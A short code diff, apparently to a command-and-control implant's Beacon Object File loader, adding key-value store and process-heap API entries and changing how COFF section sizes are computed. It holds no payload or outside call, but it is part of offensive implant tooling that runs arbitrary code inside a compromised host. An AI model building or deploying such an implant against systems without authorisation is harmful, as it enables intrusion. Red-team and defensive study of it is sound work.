@@ -86,6 +86,12 @@ static VOID NaxBofInitApiTable( NAX_BOF_API* tbl, PNAX_INSTANCE Nax ) {
     /* async BOF APIs */
     _API( 27, H_BOF_BEACONWAKEUP,          BeaconWakeup          );
     _API( 28, H_BOF_BEACONGETSTOPJOBEVENT,  BeaconGetStopJobEvent );
+    /* key-value store */
+    _API( 29, H_BOF_BEACONADDVALUE,        BeaconAddValue        );
+    _API( 30, H_BOF_BEACONGETVALUE,        BeaconGetValue        );
+    _API( 31, H_BOF_BEACONREMOVEVALUE,     BeaconRemoveValue     );
+    /* heap isolation: BOF intAlloc/intFree use private heap, not process heap */
+    _API( 32, H_BOF_GETPROCESSHEAP,        BofGetProcessHeap     );
 }
 #undef _API
 
@@ -175,12 +181,9 @@ static INT NaxBofAllocSections( PNAX_INSTANCE Nax, PBYTE bof,
     for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
         PCOF_SECTION s = sections + i;
 
-        /* Use VirtualSize for sections with no raw data (.bss = zero-init globals).
-         * Without this, .bss is NULL and BOF globals that should be 0 at entry
-         * are at garbage/NULL addresses → corrupted counters, crashes. */
         UINT32 raw_size  = s->SizeOfRawData;
         UINT32 virt_size = s->VirtualSize;
-        UINT32 need      = ( raw_size > 0 ) ? raw_size : virt_size;
+        UINT32 need      = ( virt_size > raw_size ) ? virt_size : raw_size;
 
         if ( need == 0 ) {
             mapSections[i] = NULL;
